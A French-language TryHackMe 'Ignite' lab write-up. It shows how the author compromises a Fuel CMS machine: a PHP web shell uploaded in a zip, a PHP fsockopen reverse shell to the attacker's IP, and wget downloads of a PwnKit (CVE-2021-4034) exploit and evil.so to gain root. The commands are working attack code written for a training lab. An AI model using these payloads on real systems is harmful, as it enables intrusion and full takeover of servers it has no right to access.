# TryHackMe: Ignite

**Objectif** : Le but est d'exploiter une vulnérabilité d'upload dans Fuel CMS pour déposer un web‑shell, obtenir un reverse shell, puis tirer parti de la faille PwnKit (CVE‑2021‑4034) afin de devenir root et récupérer les flags user et root.

---

## 1. Cible et setup

| Variable               | Valeur           |
| ---------------------- | ---------------- |
| IP cible               | **10.10.242.71** |
| IP attaquant (`LHOST`) | **10.21.208.96** |
| Port listener          | **4444**         |

**Outils utilisés** : `nmap` (scan), `gobuster` (bruteforce répertoires), navigateur web, `zip` (préparer l’archive du shell), `curl` (invoquer l’URL), `nc` (listener reverse‑shell), `gcc` (compiler l’exploit PwnKit).

---

## 2. Recon

```bash
nmap -T4 -Pn -n -sC -sV -p- 10.10.242.71 -oA nmap/full
```

> Scan de tous les ports pour ne pas manquer un éventuel service caché ; `-sC -sV` lance les scripts par défaut et identifie les versions.

Résultat : seul **80/tcp** (Apache) ressort ouvert.

```bash
gobuster dir -u http://10.10.242.71/ -w common.txt -x php,html,txt,zip -t 50
```

> Gobuster détecte rapidement les chemins et bannières courantes, (j'ai utilisé [common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt)); il confirme la présence de plusieurs chemins, ce qui nous intéresse ici est la page `/fuel` (probablement l'interface admin).

Interface d’admin :

```
http://10.10.242.71/fuel
```

> Les creds par défaut, `admin:admin`, nous sont directement donnés sur la page d'accueil; ils fonctionnent et donnent accès complet.

---

## 3. Upload d’un web‑shell

1. Créer `shell.php` :

```php
<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);} ?>
```

>  Ici on a un code minimal qui exécute n’importe quelle commande passée via `cmd`.

2. Compresser :

```bash
zip shell.zip shell.php
```

> *Pourquoi ?* Le module d’upload n’accepte pas le `.php`, mais autorise les `.zip` avec décompression côté serveur.

3. Dans Fuel CMS → **Assets** → **Upload** ; cocher « Unzip zip files » ; envoyer `shell.zip`.

> La décompression place `shell.php` dans un répertoire public (`/assets/pdf/`).

4. Shell disponible :

```
http://10.10.242.71/assets/pdf/shell.php
```

5. Test simple :

```bash
curl "http://10.10.242.71/assets/pdf/shell.php?cmd=whoami"
```

> *Réponse :* `www-data`, validant l’exécution de commandes.

---

## 4. Reverse‑shell interactif

Démarrer l’écoute :

```bash
nc -lvnp 4444
```

> On prépare la machine d’attaque à recevoir la connexion sortante.

Déclencher depuis le web‑shell :

```bash
curl "http://10.10.242.71/assets/pdf/shell.php?cmd=php+-r+'$s=fsockopen("10.21.208.96",4444);exec("/bin/sh -i <&4 >&4 2>&4");'"
```

> `fsockopen` fonctionne même lorsque certaines fonctions sont restreintes ; on obtient un /bin/sh via le socket.

Améliorer le TTY :

```bash
python3 -c 'import pty,os,pty; os.setsid(); pty.spawn("/bin/bash")'
export TERM=xterm
```

> Cela donne un shell interactif plus confortable (flèches, ctrl‑c).

---

## 5. Flag utilisateur

```bash
cat /home/www-data/flag.txt
```

> Le flag est traditionnellement placé dans le home de l’utilisateur, courant sur les rooms THM.

---

## 6. Élévation root (PwnKit)

Après avoir check des possibles crons root, j'ai lister les fichiers SUID :

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

> On cherche les binaires avec le bit SUID ; `pkexec` est vulnérable à **CVE‑2021‑4034**.

Compiler l’exploit côté attaquant :

```bash
gcc exploit.c -o pwnkit         # PoC Qualys
```

J'ai compiler la charge utile partagée puis hebergé nos 2 fichiers sur un serveur http pour pouvoir les télécharger sur notre cible :

```bash
gcc -shared -fPIC evil.c -o evil.so
python3 -m http.server 80
```

> *Pourquoi ?* `exploit.c` déclenche la faille, `evil.so` contient la commande qui sera exécutée en root.

Transférer et lancer sur la cible :

```bash
cd /tmp
wget http://10.21.208.96/pwnkit -O pwnkit
wget http://10.21.208.96/evil.so -O evil.so
chmod +x pwnkit
./pwnkit
```

Vérification :

```bash
whoami   # root
cat /root/root.txt
```

---

## 7. Terminé

Flags user et root récupérés, room validée.

---

**Auteur** : Saad Idrissi
